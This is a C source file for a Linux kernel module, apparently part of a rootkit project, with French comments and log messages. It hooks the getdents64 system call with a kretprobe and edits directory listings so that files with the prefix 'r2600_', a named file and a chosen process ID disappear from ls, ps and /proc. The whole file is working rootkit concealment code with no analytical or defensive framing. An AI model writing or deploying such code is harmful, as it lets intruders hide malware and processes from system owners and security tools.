#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include "hide_file.h"

#define PREFIX "r2600_"

static pid_t hidden_pid = 0;
static char hidden_file[256];

struct probe_data {
    struct linux_dirent64 __user *dirp;
};

static int entry_getdents64(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct probe_data *d = (struct probe_data *)ri->data;
    /* __x64_sys_getdents64(const struct pt_regs *regs)
     * son seul argument est dans rdi, qui pointe vers les regs du syscall */
    const struct pt_regs *sys_regs = (const struct pt_regs *)regs->di;
    d->dirp = (struct linux_dirent64 __user *)sys_regs->si;
    return 0;
}

static int ret_getdents64(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct probe_data *d = (struct probe_data *)ri->data;
    long ret             = regs_return_value(regs);
    struct linux_dirent64 *kbuf, *curr, *prev;
    char pid_str[16];
    long offset;
    int hide;

    if (ret <= 0 || !d->dirp)
        return 0;

    kbuf = kmalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return 0;

    if (copy_from_user(kbuf, d->dirp, ret)) {
        kfree(kbuf);
        return 0;
    }

    offset = 0;
    prev   = NULL;

    while (offset < ret) {
            curr = (struct linux_dirent64 *)((char *)kbuf + offset);
        hide = 0;

        if (strncmp(curr->d_name, PREFIX, strlen(PREFIX)) == 0)
            hide = 1;

        if (hidden_file[0] && strcmp(curr->d_name, hidden_file) == 0)
              hide = 1;

        if (hidden_pid) {
            snprintf(pid_str, sizeof(pid_str), "%d", hidden_pid);
            if (strcmp(curr->d_name, pid_str) == 0)
                hide = 1;
        }

        if (hide) {
            if (prev) {
                prev->d_reclen += curr->d_reclen;
            } else {
                  memmove(curr, (char *)curr + curr->d_reclen,
                        ret - offset - curr->d_reclen);
                ret -= curr->d_reclen;
                continue;
            }
        } else {
          prev = curr;
        }

        offset += curr->d_reclen;
    }

    if (copy_to_user(d->dirp, kbuf, ret))
        printk(KERN_ERR "copy_to_user a foiré\n");

    kfree(kbuf);
    regs->ax = ret;
    return 0;
}

static struct kretprobe krp = {
    .handler        = ret_getdents64,
    .entry_handler  = entry_getdents64,
    .data_size      = sizeof(struct probe_data),
    .maxactive      = 20,
    .kp.symbol_name = "__x64_sys_getdents64",
};

void set_hidden_pid(pid_t pid)
{
    hidden_pid = pid;
    printk(KERN_INFO "pid %d caché\n", pid);
}

void set_hidden_file(const char *name)
{
    strncpy(hidden_file, name, sizeof(hidden_file) - 1);
    hidden_file[sizeof(hidden_file) - 1] = '\0';
    printk(KERN_INFO "fichier %s caché\n", name);
}

void clear_hidden_file(void)
{
    hidden_file[0] = '\0';
    printk(KERN_INFO "plus de fichier caché\n");
}

int hide_file_init(void)
{
    int ret = register_kretprobe(&krp);
    if (ret < 0) {
        printk(KERN_ERR "kretprobe getdents64 échoué: %d\n", ret);
        return ret;
    }
    printk(KERN_INFO "getdents64 hookée\n");
    return 0;
}

void hide_file_exit(void)
{
    unregister_kretprobe(&krp);
    printk(KERN_INFO "getdents64 remis en place\n");
}
